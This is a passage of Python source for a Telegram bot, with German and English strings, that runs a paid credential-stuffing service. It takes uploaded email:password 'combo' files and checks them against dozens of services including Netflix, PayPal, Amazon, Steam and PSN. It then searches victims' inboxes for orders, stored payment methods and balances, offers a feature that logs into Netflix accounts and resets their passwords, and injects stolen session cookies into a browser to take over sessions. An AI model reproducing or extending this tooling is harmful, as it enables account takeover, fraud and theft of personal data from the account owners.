                bot.send_message(u[0], f"📢 <b>Message from Admin</b>\n\n{text}", parse_mode='HTML')
                success_c += 1
            except:
                failed_c += 1
            if i % 10 == 0:
                try:
                    bot.edit_message_text(f"📤 Broadcasting... {i}/{len(users_list)}\n✅ {success_c} ❌ {failed_c}",
                        message.chat.id, status_msg.message_id)
                except:
                    pass
        bot.edit_message_text(
            f"✅ <b>Broadcast fertig!</b>\n\nGesamt: {len(users_list)}\n✅ {success_c}\n❌ {failed_c}",
            message.chat.id, status_msg.message_id, parse_mode='HTML')
        return

    if s_mode == "admin_broadcast_one":
        if user_id != ADMIN_ID:
            user_sessions.pop(user_id, None)
            return
        step = session.get("step", "waiting_id")
        if step == "waiting_id":
            try:
                target_user_id = int(text.strip())
                user = get_user(target_user_id)
                if not user:
                    bot.send_message(message.chat.id, "❌ User not found!")
                    user_sessions.pop(user_id, None)
                    return
                user_sessions[user_id] = {"mode": "admin_broadcast_one", "step": "waiting_msg", "broadcast_target": target_user_id}
                bot.send_message(message.chat.id,
                    f"👤 <b>An User: {target_user_id}</b>\n\nJetzt die Nachricht senden:", parse_mode='HTML')
            except ValueError:
                bot.send_message(message.chat.id, "❌ Invalid User ID!")
                user_sessions.pop(user_id, None)
        elif step == "waiting_msg":
            target_user_id = session.get("broadcast_target")
            user_sessions.pop(user_id, None)
            if not target_user_id:
                bot.send_message(message.chat.id, "❌ Kein Ziel-User!")
                return
            try:
                bot.send_message(target_user_id, f"📢 <b>Message from Admin</b>\n\n{text}", parse_mode='HTML')
                bot.send_message(message.chat.id, f"✅ Nachricht an {target_user_id} gesendet!")
            except Exception as e:
                bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
        return

    if s_mode == "admin_group_add":
        if user_id != ADMIN_ID:
            user_sessions.pop(user_id, None)
            return
        try:
            gid = int(text.strip())
            add_allowed_group(gid)
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("◀️ Back", callback_data="admin_groups"))
            bot.send_message(message.chat.id,
                f"✅ Group <code>{gid}</code> has been activated!", parse_mode='HTML', reply_markup=markup)
        except:
            bot.send_message(message.chat.id, "❌ Invalid Chat ID!")
        user_sessions.pop(user_id, None)
        return

    if s_mode == "admin_search_log":
        if user_id != ADMIN_ID:
            user_sessions.pop(user_id, None)
            return
        try:
            target_uid = text.strip()
            user_log = get_user_log(target_uid)
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("◀️ Back", callback_data="admin_user_logs"))
            if not user_log:
                bot.send_message(message.chat.id, f"❌ Kein Log für <code>{target_uid}</code>",
                    parse_mode='HTML', reply_markup=markup)
            else:
                uname = user_log.get("username", "N/A")
                devices = ", ".join(user_log.get("devices", [])) or "N/A"
                actions = user_log.get("actions", [])[-10:]
                action_lines = [f"• {a.get('time','?')} | {a.get('action','?')[:40]} | {a.get('chat_type','?')}" for a in reversed(actions)]
                log_text = (f"📋 <b>LOG: {target_uid}</b> (@{uname})\n\n"
                    f"📱 <b>Geräte:</b> {devices}\n"
                    f"📊 <b>Aktionen:</b> {len(user_log.get('actions', []))}\n\n"
                    f"🕐 <b>Letzte 10:</b>\n" + "\n".join(action_lines) + f"\n\n💎 {MY_SIGNATURE}")
                bot.send_message(message.chat.id, log_text, parse_mode='HTML', reply_markup=markup)
        except:
            bot.send_message(message.chat.id, "❌ Search error!")
        user_sessions.pop(user_id, None)
        return

    if session.get("step") == "waiting_custom_domain":
        custom_domain = text.strip()
        if user_id in user_sessions:
            user_sessions[user_id]["custom_domain"] = custom_domain
            user_sessions[user_id]["step"] = "waiting_combo"
        bot.send_message(message.chat.id,
            f"✅ <b>Domain: {custom_domain}</b>\n\nJetzt deine Combo-Datei senden!", parse_mode='HTML')
        return

    if session.get("step") == "waiting_service" and session.get("mode") in ("inbox_single", "inbox_multi"):
        mode = session["mode"]
        if mode == "inbox_single":
            services = [text.strip()]
        else:
            services = [s.strip() for s in text.split(",") if s.strip()]

        if not services:
            bot.send_message(message.chat.id, "❌ Bitte mindestens einen Service eingeben.")
            return

        user_sessions[user_id] = {"mode": mode, "step": "waiting_combo", "services": services}
        bot.send_message(
            message.chat.id,
            t(user_id, "send_combo_for_service", services=", ".join(services)),
            parse_mode='HTML'
        )
        return

    if session.get("mode") == "cookie_login" and session.get("step") == "waiting_cookie":
        raw_cookie = text.strip()
        svc_key = session.get("service", "netflix")
        svc_names = {"netflix": "Netflix", "amazon": "Amazon", "hbomax": "HBO Max"}
        svc_emojis = {"netflix": "🎬", "amazon": "📦", "hbomax": "🎬"}
        svc_name = svc_names.get(svc_key, svc_key.title())
        svc_emoji = svc_emojis.get(svc_key, "🍪")
        cookies_list = _parse_cookies(raw_cookie)
        if not cookies_list:
            bot.send_message(message.chat.id,
                "❌ Could not parse cookies. Please send a valid cookie string.\n\n"
                "Supported: <code>name=value; name2=value2</code>, Netscape format, or JSON array.",
                parse_mode='HTML')
            return
        # ── Netflix: extract nftoken for direct browser login ──
        if svc_key == "netflix":
            nf_url = _extract_netflix_nftoken(cookies_list)
            if nf_url:
                markup = types.InlineKeyboardMarkup(row_width=2)
                markup.add(
                    types.InlineKeyboardButton("💻 PC Login", url=nf_url),
                    types.InlineKeyboardButton("📱 Phone Login", url=nf_url),
                )
                bot.send_message(
                    message.chat.id,
                    f"{svc_emoji} <b>{svc_name} Direct Login Ready</b>\n\n"
                    f"🍪 <b>Cookies parsed:</b> {len(cookies_list)}\n"
                    f"🔑 <b>nftoken extracted</b>\n\n"
                    "Tap the button \u2014 it opens in your <b>browser</b> and logs you in instantly.\n"
                    "(No app, no console, no steps needed)",
                    parse_mode='HTML',
                    reply_markup=markup
                )
                user_sessions.pop(user_id, None)
                return
        # ── Amazon / HBO Max (and Netflix fallback): bookmarklet page ──
        token = uuid.uuid4().hex
        _save_cookie_session(token, svc_key, cookies_list)
        pc_url = f"{_BOT_WEB_BASE}/cl/{token}/pc"
        phone_url = f"{_BOT_WEB_BASE}/cl/{token}/phone"
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton("💻 PC Login", url=pc_url),
            types.InlineKeyboardButton("📱 Phone Login", url=phone_url),
        )
        bot.send_message(
            message.chat.id,
            f"{svc_emoji} <b>{svc_name} Cookie Login Ready</b>\n\n"
            f"🍪 <b>Cookies loaded:</b> {len(cookies_list)}\n\n"
            "Click a button to open the login page.\n"
            "The page will auto-inject cookies in your browser.",
            parse_mode='HTML',
            reply_markup=markup
        )
        user_sessions.pop(user_id, None)
        return

    if maintenance_mode and user_id != ADMIN_ID:
        if text in ("📋 Start Scan", "📦 Multi Scan", "🧹 Combo Cleaner", "📧 Mail Extractor",
                     "📬 Einzeln Inboxen", "📬 Mehrere Inboxen", "📬 Single Inbox", "📬 Multi Inbox",
                     "🚗 RYD Inboxen", "🏨 Limehome Inboxen", "📦 Amazon Inboxen",
                     "💰 PayPal Inboxen", "🚕 Uber Inboxen", "🍕 Lieferando Inboxen",
                     "✈️ Booking Inboxen", "👗 Zalando Inboxen", "🛴 Lime Inboxen",
                     "💳 PAYBACK Inboxen", "🚆 DB Inboxen",
                     "📦 DHL Inboxen", "🛒 Otto Inboxen", "🏷️ eBay Inboxen",
                     "🎬 Netflix Inbox Count", "🎬 Netflix Premium ★", "🎬 Netflix Checker", "🔑 Netflix Pass Reset", "🎮 PSN Inboxen", "💻 Steam Inboxen", "⚽ eFootball Inboxen", "🎵 TikTok Inboxen", "🎵 TikTok 1K+ Inboxen", "📸 Instagram Inboxen", "⚔️ Supercell Inboxen", "🔒 VPN Inboxen", "🌐 Hosting Inboxen", "☁️ AWS Inboxen", "📸 Instagram Checker", "🎵 TikTok Checker", "🍥 Crunchyroll Inboxen", "🎵 Spotify Inboxen", "🎵 Spotify Premium Inbox",
                     "✅ Check24 Inboxen", "👠 SHEIN Inboxen", "🚌 FlixBus Inboxen",
                     "🍾 Flaschenpost Inboxen", "🍔 McDonald's Inboxen", "🍿 Netflix Cookie Login", "📦 Amazon Cookie Login", "🎬 HBO Max Cookie Login",
                     "⚡ All Scan"):
            bot.send_message(message.chat.id, t(user_id, "maintenance", signature=MY_SIGNATURE), parse_mode='HTML')
            return

    KEY_REQUIRED_FEATURES = (
        "📋 Start Scan", "📦 Multi Scan", "🧹 Combo Cleaner", "📧 Mail Extractor",
        "📬 Einzeln Inboxen", "📬 Mehrere Inboxen", "📬 Single Inbox", "📬 Multi Inbox",
        "🚗 RYD Inboxen", "🏨 Limehome Inboxen", "📦 Amazon Inboxen",
        "💰 PayPal Inboxen", "🚕 Uber Inboxen", "🍕 Lieferando Inboxen",
        "✈️ Booking Inboxen", "👗 Zalando Inboxen", "🛴 Lime Inboxen",
        "💳 PAYBACK Inboxen", "🚆 DB Inboxen",
        "📦 DHL Inboxen", "🛒 Otto Inboxen", "🏷️ eBay Inboxen",
        "🎬 Netflix Inbox Count", "🎬 Netflix Premium ★", "🎬 Netflix Checker", "🔑 Netflix Pass Reset", "🎮 PSN Inboxen", "💻 Steam Inboxen", "⚽ eFootball Inboxen", "🎵 TikTok Inboxen", "🎵 TikTok 1K+ Inboxen", "📸 Instagram Inboxen", "⚔️ Supercell Inboxen", "🔒 VPN Inboxen", "🌐 Hosting Inboxen", "☁️ AWS Inboxen", "📸 Instagram Checker", "🎵 TikTok Checker", "🍥 Crunchyroll Inboxen", "🎵 Spotify Inboxen", "🎵 Spotify Premium Inbox",
        "✅ Check24 Inboxen", "👠 SHEIN Inboxen", "🚌 FlixBus Inboxen",
        "🍾 Flaschenpost Inboxen", "🍔 McDonald's Inboxen",
        "🍿 Netflix Cookie Login", "📦 Amazon Cookie Login", "🎬 HBO Max Cookie Login",
        "⚡ All Scan",
        "🔀 Combo Generator", "📊 Meine Stats", "📊 My Stats",
        "📜 Scan Verlauf", "📜 Scan History"
    )
    if text in KEY_REQUIRED_FEATURES and user_id != ADMIN_ID and not in_free_group:
        if not is_vip(user_id):
            bot.send_message(message.chat.id, t(user_id, "key_required", signature=MY_SIGNATURE), parse_mode='HTML')
            return

    if _btn_match("btn_reload") or text in ("🔄 Reload", "🔄 Neu laden"):
        first_name = message.from_user.first_name or "User"
        user = get_json_user(user_id)
        vip_status = '👑 VIP' if is_vip(user_id) else 'Free'
        admin_badge = "🔧 ADMIN" if user_id == ADMIN_ID else ""
        reload_text = t(user_id, "reload", admin_badge=admin_badge, first_name=first_name,
                       uid=user_id, vip_status=vip_status,
                       points=user.get('points', 0) if user else 0, signature=MY_SIGNATURE)
        bot.send_message(user_id, reload_text, parse_mode='HTML',
                        reply_markup=main_menu_keyboard(user_id))
        return

    if _btn_match("btn_start_scan") or text == "📋 Start Scan":
        can, remaining = can_scan(user_id)
        if not can:
            bot.send_message(message.chat.id, t(user_id, "rate_limit", remaining=remaining), parse_mode='HTML')
            return
        bot.send_message(message.chat.id, t(user_id, "select_scan_mode"),
                        parse_mode='HTML', reply_markup=scan_mode_keyboard(user_id))

    elif text == "⚡ All Scan":
        can, remaining = can_scan(user_id)
        if not can:
            bot.send_message(message.chat.id, t(user_id, "rate_limit", remaining=remaining), parse_mode='HTML')
            return
        user_sessions[user_id] = {"mode": "all"}
        bot.send_message(
            message.chat.id,
            "⚡ <b>ALL SERVICES SCAN</b>\n\n"
            "📝 Checks 60+ platforms at once:\n"
            "• 📱 Social: Instagram, TikTok, Twitter, LinkedIn, Snapchat\n"
            "• 🎮 Gaming: Steam, Xbox, PSN, Epic, Free Fire, PUBG, Konami\n"
            "• 📺 Streaming: Netflix, Spotify, Disney+, Hulu, HBO Max\n"
            "• 💰 Finance: PayPal, Binance, Coinbase\n"
            "• 🛍 Shopping: Shein, Amazon & more\n\n"
            "📁 <b>Send your combo file now</b>\n"
            "<code>Format: email:password</code>",
            parse_mode='HTML'
        )

    elif _btn_match("btn_multi_scan") or text == "📦 Multi Scan":
        if not is_vip(user_id):
            bot.send_message(message.chat.id, t(user_id, "vip_only"), parse_mode='HTML')
        else:
            bot.send_message(message.chat.id, t(user_id, "multi_scan_prompt"), parse_mode='HTML')

    elif _btn_match("btn_my_stats") or text in ("📊 My Stats", "📊 Meine Stats"):
        user = get_user(user_id)
        if user:
            stats_text = f"""
📊 <b>Your Statistics</b>

👤 <b>User Info:</b>
• ID: <code>{user[0]}</code>
• Username: @{user[1] or 'N/A'}
• Status: {'👑 VIP' if user[2] else '⭐ Free'}
• Joined: {user[12][:10] if user[12] else 'N/A'}

📈 <b>Scan History:</b>
• Total Scans: {user[10] or 0}
• Total Hits: {user[11] or 0}

⏰ <b>Last Scan:</b>
{user[9][:19] if user[9] else 'Never'}

💎 <b>Created by {MY_SIGNATURE}</b>
"""
            bot.send_message(message.chat.id, stats_text, parse_mode='HTML')

    elif _btn_match("btn_membership") or text in ("👑 Membership",):
        user = get_user(user_id)
        first_name = message.from_user.first_name or "User"
        username_display = f"@{message.from_user.username}" if message.from_user.username else str(user_id)

        if user_id == ADMIN_ID:
            role = "🔧 ADMIN"
            role_badge = "Administrator"
            vip_until = user[3] if user else "Forever"
            if vip_until == "Forever":
                expiry = "♾️ Lifetime"
            elif vip_until:
                expiry = vip_until[:19]
            else:
                expiry = "♾️ Lifetime"

            membership_text = f"""
🔧 <b>ADMIN MEMBERSHIP</b>

👤 <b>Name:</b> {first_name}
🆔 <b>User:</b> {username_display}
🏷️ <b>Role:</b> {role_badge}
✅ <b>Status:</b> Active
⏰ <b>Valid Until:</b> {expiry}

🎁 <b>Your Permissions:</b>
✅ All bot features
✅ Admin Panel access
✅ Unlimited scans
✅ TikTok Full Capture
✅ User management
✅ VIP/Ban controls

💎 <b>{MY_SIGNATURE}</b>
"""
        elif user and user[2] and is_vip(user_id):
            vip_until = user[3]
            if vip_until == "Forever":
                expiry = "♾️ Lifetime VIP"
                plan_name = "👑 VIP Forever"
            else:
                expiry = vip_until[:19] if vip_until else "Unknown"
                plan_name = "👑 VIP"

            membership_text = f"""
👑 <b>VIP MEMBERSHIP</b>

👤 <b>Name:</b> {first_name}
🆔 <b>User:</b> {username_display}
🏷️ <b>Plan:</b> {plan_name}
✅ <b>Status:</b> Active
⏰ <b>Valid Until:</b> {expiry}

🎁 <b>Your Benefits:</b>
✅ Unlimited scans
✅ Multi-scan feature
✅ TikTok Full Capture
✅ Priority support

💎 <b>{MY_SIGNATURE}</b>
"""
        else:
            membership_text = f"""
⭐ <b>FREE MEMBERSHIP</b>

👤 <b>Name:</b> {first_name}
🆔 <b>User:</b> {username_display}
🏷️ <b>Plan:</b> Free
📊 <b>Status:</b> Active

📋 <b>Your Features:</b>
✅ 1 scan per hour
✅ All scan modes
✅ AI Platforms check

👑 <b>Upgrade to VIP:</b>
💎 Unlimited scans
💎 TikTok Full Capture
💎 Multi-scan feature

📞 <b>Contact admin to upgrade!</b>

💎 <b>{MY_SIGNATURE}</b>
"""
        bot.send_message(message.chat.id, membership_text, parse_mode='HTML')

    elif _btn_match("btn_scan_history") or text in ("📜 Scan History", "📜 Scan Verlauf"):
        conn = get_db()
        c = conn.cursor()
        c.execute("SELECT scan_date, scan_mode, hits_count, bad_count, total_checked FROM scans WHERE user_id = ? ORDER BY scan_id DESC LIMIT 10", (user_id,))
        scans = c.fetchall()
        conn.close()

        if not scans:
            bot.send_message(message.chat.id,
                "📜 <b>SCAN HISTORY</b>\n\n"
                "❌ No scans yet!\n\n"
                "Start your first scan with 📋 Start Scan",
                parse_mode='HTML')
        else:
            history_text = "📜 <b>SCAN HISTORY</b>\n<i>Last 10 scans</i>\n\n"
            for i, scan in enumerate(scans, 1):
                scan_date = scan[0][:16] if scan[0] else "Unknown"
                mode = scan[1] or "Standard"
                hits = scan[2] or 0
                bad = scan[3] or 0
                total = scan[4] or 0
                hit_rate = round((hits / total * 100), 1) if total > 0 else 0

                history_text += (
                    f"<b>#{i}</b> 📅 {scan_date}\n"
                    f"   🔎 Mode: <b>{mode}</b>\n"
                    f"   ✅ Hits: <b>{hits}</b> | ❌ Bad: {bad} | 📊 Total: {total}\n"
                    f"   📈 Hit Rate: <b>{hit_rate}%</b>\n\n"
                )

            history_text += f"💎 {MY_SIGNATURE}"
            bot.send_message(message.chat.id, history_text, parse_mode='HTML')

    elif _btn_match("btn_referral") or text in ("🔗 My Referral", "🔗 Mein Referral"):
        user = get_user(user_id)
        if user:
            ref_code = user[6]  # referral_code
            ref_count = user[8]  # referrals_count

            # Get bot username
            bot_info = bot.get_me()
            ref_link = f"https://t.me/{bot_info.username}?start={ref_code}"

            # Create share button
            markup = types.InlineKeyboardMarkup()
            share_btn = types.InlineKeyboardButton(
                "📤 Share Link", 
                url=f"https://t.me/share/url?url={urllib.parse.quote(ref_link)}&text={urllib.parse.quote('Join the best Hotmail checker bot!')}"
            )
            markup.add(share_btn)

            referral_text = f"""
🔗 <b>Your Referral System</b>

👥 <b>How it works:</b>
Share your link and get <b>+1 hour VIP</b> per new user!

🎯 <b>Your Referral Link:</b>
<code>{ref_link}</code>

📊 <b>Your Stats:</b>
• Total Referrals: <b>{ref_count}</b> users
• VIP Earned: <b>{ref_count}</b> hour(s)

💡 <b>Tip:</b>
Share the link on social media to get more referrals!

💎 <b>{MY_SIGNATURE}</b>
"""
            bot.send_message(message.chat.id, referral_text, 
                           parse_mode='HTML',
                           reply_markup=markup)
        return  # IMPORTANT: Stop here to prevent repeating!

    elif _btn_match("btn_support") or text == "📞 Support":
        support_text = f"""
📞 <b>SUPPORT</b>

💬 <b>Contact Developer:</b>
• Telegram: {MY_SIGNATURE}

💎 <b>Created by {MY_SIGNATURE}</b>
"""
        bot.send_message(message.chat.id, support_text, parse_mode='HTML')

    elif _btn_match("btn_single_inbox") or text in ("📬 Einzeln Inboxen", "📬 Single Inbox"):
        user_sessions[user_id] = {"mode": "inbox_single", "step": "waiting_service"}
        bot.send_message(
            message.chat.id,
            "📬 <b>SINGLE INBOX</b>\n\n"
            "Enter the service name you want to check.\n\n"
            "Examples:\n"
            "• <code>Reddit</code>\n"
            "• <code>Check24</code>\n"
            "• <code>Amazon</code>\n"
            "• <code>PayPal</code>",
            parse_mode='HTML'
        )

    elif _btn_match("btn_multi_inbox") or text in ("📬 Mehrere Inboxen", "📬 Multi Inbox"):
        user_sessions[user_id] = {"mode": "inbox_multi", "step": "waiting_service"}
        bot.send_message(
            message.chat.id,
            "📬 <b>MULTI INBOX</b>\n\n"
            "Enter the services you want to check.\n"
            "Separate them with commas:\n\n"
            "Example:\n"
            "<code>Reddit, Check24, Amazon, PayPal</code>",
            parse_mode='HTML'
        )

    elif text == "🚗 RYD Inboxen":
        user_sessions[user_id] = {"mode": "inbox_ryd", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "🚗 <b>RYD INBOX</b>\n\n"
            "Checks combos for:\n"
            "• Emails from <code>noreply@ryd.one</code>\n"
            "• Orders (ride bookings)\n"
            "• Stored payment method\n\n"
            "📁 Send your combo file now!\n"
            "Format: <code>email:password</code>",
            parse_mode='HTML'
        )

    elif text == "🏨 Limehome Inboxen":
        user_sessions[user_id] = {"mode": "inbox_limehome", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "🏨 <b>LIMEHOME INBOX</b>\n\n"
            "Checks combos for:\n"
            "• Emails from <code>limehome.com</code>\n"
            "• Bookings & reservations\n"
            "• Stored payment method\n\n"
            "📁 Send your combo file now!\n"
            "Format: <code>email:password</code>",
            parse_mode='HTML'
        )

    elif text == "📦 Amazon Inboxen":
        user_sessions[user_id] = {"mode": "inbox_amazon", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "📦 <b>AMAZON INBOX</b>\n\n"
            "Checks combos for:\n"
            "• Emails from <code>amazon.de / amazon.com</code>\n"
            "• Order numbers & shipping confirmations\n"
            "• Stored payment method\n\n"
            "📁 Send your combo file now!\n"
            "Format: <code>email:password</code>",
            parse_mode='HTML'
        )

    elif text == "💰 PayPal Inboxen":
        user_sessions[user_id] = {"mode": "inbox_paypal", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "💰 <b>PAYPAL INBOX</b>\n\n"
            "Checks combos for:\n"
            "• Emails from <code>paypal.de / paypal.com</code>\n"
            "• Transactions & payments\n"
            "• Stored payment method\n\n"
            "📁 Send your combo file now!\n"
            "Format: <code>email:password</code>",
            parse_mode='HTML'
        )

    elif text == "🚕 Uber Inboxen":
        user_sessions[user_id] = {"mode": "inbox_uber", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "🚕 <b>UBER INBOX</b>\n\n"
            "Checks combos for:\n"
            "• Emails from <code>uber.com</code>\n"
            "• Rides & Uber Eats orders\n"
            "• Stored payment method\n\n"
            "📁 Send your combo file now!\n"
            "Format: <code>email:password</code>",
            parse_mode='HTML'
        )

    elif text == "🍕 Lieferando Inboxen":
        user_sessions[user_id] = {"mode": "inbox_lieferando", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "🍕 <b>LIEFERANDO INBOX</b>\n\n"
            "Checks combos for:\n"
            "• Emails from <code>lieferando.de</code>\n"
            "• Orders & deliveries\n"
            "• Stored payment method\n\n"
            "📁 Send your combo file now!\n"
            "Format: <code>email:password</code>",
            parse_mode='HTML'
        )

    elif text == "✈️ Booking Inboxen":
        user_sessions[user_id] = {"mode": "inbox_booking", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "✈️ <b>BOOKING.COM INBOX</b>\n\n"
            "Checks combos for:\n"
            "• Emails from <code>booking.com</code>\n"
            "• Bookings & reservations\n"
            "• Stored payment method\n\n"
            "📁 Send your combo file now!\n"
            "Format: <code>email:password</code>",
            parse_mode='HTML'
        )

    elif text == "👗 Zalando Inboxen":
        user_sessions[user_id] = {"mode": "inbox_zalando", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "👗 <b>ZALANDO INBOX</b>\n\n"
            "Checks combos for:\n"
            "• Emails from <code>zalando.de / zalando.com</code>\n"
            "• Orders & returns\n"
            "• Stored payment method\n\n"
            "📁 Send your combo file now!\n"
            "Format: <code>email:password</code>",
            parse_mode='HTML'
        )

    elif text == "🛴 Lime Inboxen":
        user_sessions[user_id] = {"mode": "inbox_lime", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "🛴 <b>LIME INBOX</b>\n\n"
            "Checks combos for:\n"
            "• Emails from <code>no-reply@li.me</code>\n"
            "• Rides & trips\n"
            "• Stored payment method\n\n"
            "📁 Send your combo file now!\n"
            "Format: <code>email:password</code>",
            parse_mode='HTML'
        )

    elif text == "💳 PAYBACK Inboxen":
        user_sessions[user_id] = {"mode": "inbox_payback", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "💳 <b>PAYBACK INBOX</b>\n\n"
            "Checks combos for:\n"
            "• Emails from <code>service@payback.de</code>\n"
            "• 💰 <b>Point balance</b> (how many points)\n\n"
            "📁 Send your combo file now!\n"
            "Format: <code>email:password</code>",
            parse_mode='HTML'
        )

    elif text == "🚆 DB Inboxen":
        user_sessions[user_id] = {"mode": "inbox_deutschebahn", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "🚆 <b>DEUTSCHE BAHN INBOX</b>\n\n"
            "Checks combos for:\n"
            "• Emails from <code>noreply@bahn.de</code>\n"
            "• Emails from <code>noreply@deutschebahn.com</code>\n"
            "• 🎫 Booking numbers & tickets\n"
            "• Stored payment method\n\n"
            "📁 Send your combo file now!\n"
            "Format: <code>email:password</code>",
            parse_mode='HTML'
        )

    elif text == "📦 DHL Inboxen":
        user_sessions[user_id] = {"mode": "inbox_dhl", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "📦 <b>DHL INBOX</b>\n\n"
            "Checks combos for:\n"
            "• Emails from <code>noreply@dhl.de</code>\n"
            "• Emails from <code>paket@dhl.de</code>\n"
            "• 📬 Tracking numbers & shipments\n\n"
            "📁 Send your combo file now!\n"
            "Format: <code>email:password</code>",
            parse_mode='HTML'
        )

    elif text == "🛒 Otto Inboxen":
        user_sessions[user_id] = {"mode": "inbox_otto", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "🛒 <b>OTTO INBOX</b>\n\n"
            "Checks combos for:\n"
            "• Emails from <code>noreply@otto.de</code>\n"
            "• Emails from <code>service@otto.de</code>\n"
            "• 📦 Order numbers\n"
            "• Stored payment method\n\n"
            "📁 Send your combo file now!\n"
            "Format: <code>email:password</code>",
            parse_mode='HTML'
        )

    elif text == "🏷️ eBay Inboxen":
        user_sessions[user_id] = {"mode": "inbox_ebay", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "🏷️ <b>EBAY INBOX</b>\n\n"
            "Checks combos for:\n"
            "• Emails from <code>ebay@ebay.de</code>\n"
            "• Emails from <code>reply@ebay.de</code>\n"
            "• 🛍️ Item numbers & orders\n"
            "• Stored payment method\n\n"
            "📁 Send your combo file now!\n"
            "Format: <code>email:password</code>",
            parse_mode='HTML'
        )

    elif text == "🎬 Netflix Premium ★":
        if user_id != ADMIN_ID:
            bot.send_message(message.chat.id, "❌ This feature is <b>admin only</b>.", parse_mode='HTML')
            return
        user_sessions[user_id] = {"mode": "inbox_netflix", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "🎬 <b>NETFLIX PREMIUM INBOX CHECKER</b> ★\n\n"
            "👑 <b>Admin mode — Plan detection active</b>\n\n"
            "• Scans: <code>info@account.netflix.com</code>\n"
            "• Detects: 4K Ultra HD / Standard / Basic / Ads plan\n"
            "• Extracts: billing date, payment amount\n"
            "• Reports: only accounts with confirmed plan emails\n\n"
            "📁 Send your combo file now!\n"
            "Format: <code>email:password</code>",
            parse_mode='HTML'
        )

    elif text == "🎬 Netflix Checker":
        user_sessions[user_id] = {"mode": "check_netflix_direct", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "🎬 <b>NETFLIX CHECKER</b>\n\n"
            "Directly checks Netflix email:password combos.\n\n"
            "✅ <b>Hit shows:</b>\n"
            "• 📋 Plan / Tier (Standard, Premium, etc.)\n"
            "• 🌍 Country\n"
            "• 📅 Expiry / Next billing date\n"
            "• 📺 Max streams & resolution\n\n"
            "📁 Send your combo file now!\n"
            "Format: <code>email:password</code>\n\n"
            f"💎 {MY_SIGNATURE}",
            parse_mode='HTML'
        )

    elif text == "🔑 Netflix Pass Reset":
        user_sessions[user_id] = {"mode": "netflix_pass_reset", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "🔑 <b>NETFLIX PASSWORD RESET</b>\n\n"
            "Logs into each Netflix account and resets the password to:\n"
            "🔐 <code>spark_god_45</code>\n\n"
            "✅ <b>Reset OK:</b> Password successfully changed\n"
            "❌ <b>Bad:</b> Wrong original credentials\n"
            "⚠️ <b>Failed:</b> Could not reset (2FA or locked)\n\n"
            "📁 Send your combo file now!\n"
            "Format: <code>email:oldpassword</code>\n\n"
            f"💎 {MY_SIGNATURE}",
            parse_mode='HTML'
        )

    elif text == "🎬 Netflix Inbox Count":
        user_sessions[user_id] = {"mode": "inbox_netflix_count", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "🎬 <b>NETFLIX INBOX COUNT</b>\n\n"
            "Counts Netflix emails per account:\n"
            "• Checks: <code>info@account.netflix.com</code>\n"
            "• Reports: every account that has ANY Netflix email\n"
            "• Shows: how many Netflix emails were found\n\n"
            "📁 Send your combo file now!\n"
            "Format: <code>email:password</code>",
            parse_mode='HTML'
        )

    elif text == "🎮 PSN Inboxen":
        user_sessions[user_id] = {"mode": "inbox_psn", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "🎮 <b>PSN DETAILED INBOX CHECKER</b>\n\n"
            "Deep-scans PlayStation Network emails:\n"
            "• PS Plus: Essential / Extra / Premium tier detection\n"
            "• Purchase confirmations & transaction history\n"
            "• Wallet top-ups & in-game purchases\n"
            "• Subscription renewal dates\n\n"
            "📬 Checks senders:\n"
            "• <code>reply@txn-email.playstation.com</code>\n"
            "• <code>noreply@playstation.com</code>\n\n"
            "📁 Send your combo file now!\n"
            "Format: <code>email:password</code>",
            parse_mode='HTML'
        )

    elif text == "💻 Steam Inboxen":
        user_sessions[user_id] = {"mode": "inbox_steam", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "💻 <b>STEAM INBOX CHECKER</b>\n\n"
            "Deep-scans Steam account emails:\n"
            "• Game purchase receipts & transaction history\n"
            "• Wallet top-up confirmations\n"
            "• Gift receipts\n"
            "• Steam Guard activity\n\n"
            "📬 Checks sender:\n"
            "• <code>noreply@steampowered.com</code>\n\n"
            "📁 Send your combo file now!\n"
            "Format: <code>email:password</code>",
            parse_mode='HTML'
        )

    elif text == "⚽ eFootball Inboxen":
        user_sessions[user_id] = {"mode": "inbox_efootball", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "⚽ <b>eFOOTBALL INBOX CHECKER</b>\n\n"
            "Checks email:pass combos for valid accounts:\n"
            "• ✅ <b>HIT</b> = email &amp; password are valid (login works)\n"
            "• 🎮 Also searches inbox for Konami / eFootball emails\n"
            "• Shows GP (Game Points), myKONAMI activity if found\n\n"
            "📬 Checks senders:\n"
            "• <code>noreply@konami.net</code>\n"
            "• <code>no-reply@konami.net</code>\n"
            "• <code>support@konami.net</code>\n\n"
            "📁 Send your combo file now!\n"
            "Format: <code>email:password</code>",
            parse_mode='HTML'
        )

    elif text == "🍥 Crunchyroll Inboxen":
        user_sessions[user_id] = {"mode": "inbox_crunchyroll", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "🍥 <b>CRUNCHYROLL INBOX CHECKER</b>\n\n"
            "Checks combos for:\n"
            "• Emails from <code>support@crunchyroll.com</code>\n"
            "• 🍥 Premium / Mega Fan / Ultimate Fan detection\n"
            "• Only reports accounts with active premium found!\n\n"
            "📁 Send your combo file now!\n"
            "Format: <code>email:password</code>",
            parse_mode='HTML'
        )
